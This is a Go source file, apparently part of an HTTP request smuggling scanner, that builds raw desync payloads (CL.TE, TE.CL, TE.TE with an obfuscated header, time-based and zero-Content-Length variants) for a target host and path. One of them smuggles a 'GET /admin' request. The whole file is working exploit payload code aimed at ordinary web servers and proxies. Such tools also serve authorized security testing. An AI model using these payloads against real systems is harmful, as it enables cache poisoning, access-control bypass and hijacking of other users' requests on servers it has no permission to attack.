package payloads

import (
	"fmt"
	"net/url"

	"request_smuggling/core"
)

func extractVariablesFromRecord(rec core.Record) (string, string, string) {
	u, _ := url.Parse(rec.Request.Endpoint)
	path := u.Path
	if path == "" {
		path = "/"
	}
	ua := rec.Request.UserAgent
	if ua == "" {
		ua = "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
	}
	return path, u.Host, ua
}

func BuildTECL(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 4\r\n"+
			"Transfer-Encoding: chunked\r\n\r\n"+
			"5e\r\n"+
			"POST /404 HTTP/1.1\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 15\r\n\r\n"+
			"x=1\r\n0\r\n\r\n",
		path, host, ua,
	)
	return []byte(payload)
}
func BuildTimeTECL(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 6\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n"+
			"0\r\n"+
			"\r\n"+
			"G",
		path, host, ua,
	)
	return []byte(payload)
}
func BuildCLTE(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 44\r\n"+
			"Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n0\r\n\r\n"+
			"GET /hopefully404 HTTP/1.1\r\n"+
			"X-Ignore: x",
		path, host, ua,
	)
	return []byte(payload)
}

func BuildTimeCLTE(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 4\r\n"+
			"Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n"+
			"1\r\n"+
			"G\r\n"+
			"0\r\n"+
			"\r\n",
		path, host, ua,
	)
	return []byte(payload)
}

func BuildTETE(rec core.Record, obfuscatedHeader string) ([]byte, []byte) {
	path, host, ua := extractVariablesFromRecord(rec)
	payload2 := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Lenght: 3\r\n"+
			"Transfer-Encoding: invalid\r\n"+
			"%s\r\n"+
			"\r\n"+
			"1\r\nG\r\n0\r\n\r\n",
		path, host, ua, obfuscatedHeader,
	)
	payload1 := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 3\r\n"+
			"%s\r\n"+
			"Transfer-Encoding: invalid\r\n"+
			"\r\n"+
			"1\r\nG\r\n0\r\n\r\n",
		path, host, ua, obfuscatedHeader,
	)
	return []byte(payload1), []byte(payload2)
}

func BuildZeroCLProbe(rec core.Record) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: 10\r\n"+
			"Content-type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"\r\n"+
			"x=1",
		path, host, ua,
	)
	return []byte(payload)
}

func BuildZeroCLHeadAndBody(rec core.Record, timebased bool) ([]byte, []byte) {
	path, host, ua := extractVariablesFromRecord(rec)

	body := fmt.Sprintf(
		"GET /admin HTTP/1.1\r\n" +
			"X-Ignore: dummy",
	)

	cl := 0
	if timebased {
		cl = len(body)
	}

	headers := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n",
		path, host, ua, cl,
	)
	return []byte(headers), []byte(body)
}
